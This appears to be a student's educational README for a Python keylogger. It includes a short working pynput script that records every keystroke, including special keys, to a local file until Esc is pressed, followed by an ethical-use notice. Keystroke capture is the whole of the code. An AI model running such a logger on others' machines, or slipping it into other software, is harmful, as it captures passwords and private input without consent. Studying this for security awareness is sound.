# Keylogger
## Done by : Divakar R

## AIM:
To design and implement a Python-based keylogger that records keystrokes on a computer system for educational and ethical cybersecurity purposes. The project demonstrates how attackers may exploit keylogging techniques and helps raise awareness of securing input systems.


## Problem Statement:

Keyloggers are tools used to monitor and record keystrokes entered by users on a keyboard. While they can be malicious, they are also powerful tools in cybersecurity training and ethical hacking scenarios. The challenge is to build a keylogger that:

Runs in the background

Logs both alphabetic and special keys

Stores logs to a file

Optionally can be extended for further analysis or email alerts


## Code:

```
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")  # Handle special keys like Shift, Enter

def on_release(key):
    if key == Key.esc:  # Press Esc to stop logging
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

## Ethical Notice:

This project is intended strictly for educational use. Unauthorized use of keyloggers is illegal and unethical. Always take user consent and use only in controlled environments.
